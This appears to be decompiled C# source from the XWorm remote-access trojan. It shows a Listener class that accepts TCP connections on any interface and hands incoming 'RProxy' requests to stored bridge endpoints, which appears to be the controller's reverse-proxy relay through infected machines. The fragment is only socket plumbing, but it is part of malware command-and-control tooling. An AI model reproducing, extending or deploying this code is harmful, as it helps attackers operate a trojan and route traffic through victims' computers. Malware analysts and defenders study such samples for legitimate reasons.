using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x0200003E RID: 62
	public class Listener
	{
		// Token: 0x06000A01 RID: 2561 RVA: 0x00058888 File Offset: 0x00056A88
		public Listener()
		{
			this.string_0 = "|";
		}

		// Token: 0x06000A02 RID: 2562 RVA: 0x000588A0 File Offset: 0x00056AA0
		public void method_0(int int_2, int int_3, int Port)
		{
			this.int_0 = int_2;
			this.int_1 = int_3;
			Listener.tcpListener = new TcpListener(IPAddress.Any, Port);
			Listener.tcpListener.Start();
			Listener.thread = new Thread(new ThreadStart(this.method_1));
			Listener.thread.Start();
		}

		// Token: 0x06000A03 RID: 2563 RVA: 0x000588F8 File Offset: 0x00056AF8
		public static void Close()
		{
			try
			{
				Listener.tcpListener.Stop();
				Thread thread = Listener.thread;
				if (thread != null)
				{
					thread.Abort();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000A04 RID: 2564 RVA: 0x00058944 File Offset: 0x00056B44
		private void method_1()
		{
			for (;;)
			{
				try
				{
					TcpClient parameter = Listener.tcpListener.AcceptTcpClient();
					Thread thread = new Thread(new ParameterizedThreadStart(this.method_15));
					thread.Start(parameter);
					Thread.Sleep(50);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000A05 RID: 2565 RVA: 0x000589AC File Offset: 0x00056BAC
		private void method_4(TcpClient tcpClient_0)
		{
			try
			{
				NetworkStream stream = tcpClient_0.GetStream();
				byte[] array = new byte[1];
				StringBuilder stringBuilder = new StringBuilder();
				for (;;)
				{
					int num = stream.Read(array, 0, array.Length);
					bool flag = num == 0;
					if (flag)
					{
						break;
					}
					stringBuilder.Append(Encoding.ASCII.GetString(array, 0, num));
					bool flag2 = stringBuilder.ToString().EndsWith("\r\n\r\n");
					if (flag2)
					{
						goto Block_3;
					}
				}
				tcpClient_0.Close();
				stream.Close();
				return;
				Block_3:
				stringBuilder = new StringBuilder(Uri.UnescapeDataString(stringBuilder.ToString()));
				bool flag3 = stringBuilder.ToString().Contains("RProxy");
				if (flag3)
				{
					string text = stringBuilder.ToString().Substring(checked(stringBuilder.ToString().IndexOf(":") + 1));
					text = text.Substring(0, text.IndexOf("\r\n"));
					bool flag4 = false;
					try
					{
						try
						{
							foreach (BridgeEndPoint bridgeEndPoint in Main.list_4)
							{
								bool flag5 = Operators.CompareString(bridgeEndPoint.string_1, text, false) == 0;
								if (flag5)
								{
									bridgeEndPoint.tcpClient_0 = tcpClient_0;
									flag4 = true;
									break;
								}
							}
						}
						finally
						{
							List<BridgeEndPoint>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
					}
					finally
					{
						List<BridgeEndPoint>.Enumerator enumerator2;
						((IDisposable)enumerator2).Dispose();
					}
					bool flag6 = !flag4;
					if (flag6)
					{
						tcpClient_0.Close();
						stream.Close();
					}
				}
				else
				{
					tcpClient_0.Close();
					stream.Close();
				}
			}
			catch (Exception ex)
			{
				tcpClient_0.Close();
			}
		}

		// Token: 0x06000A06 RID: 2566 RVA: 0x00058B9C File Offset: 0x00056D9C
		private void method_15(object object_0)
		{
			this.method_4((TcpClient)object_0);
		}

		// Token: 0x04000438 RID: 1080
		private static Thread thread;

		// Token: 0x04000439 RID: 1081
		private static TcpListener tcpListener;

		// Token: 0x0400043A RID: 1082
		public int int_0;

		// Token: 0x0400043B RID: 1083
		public int int_1;

		// Token: 0x0400043C RID: 1084
		private string string_0;
	}
}
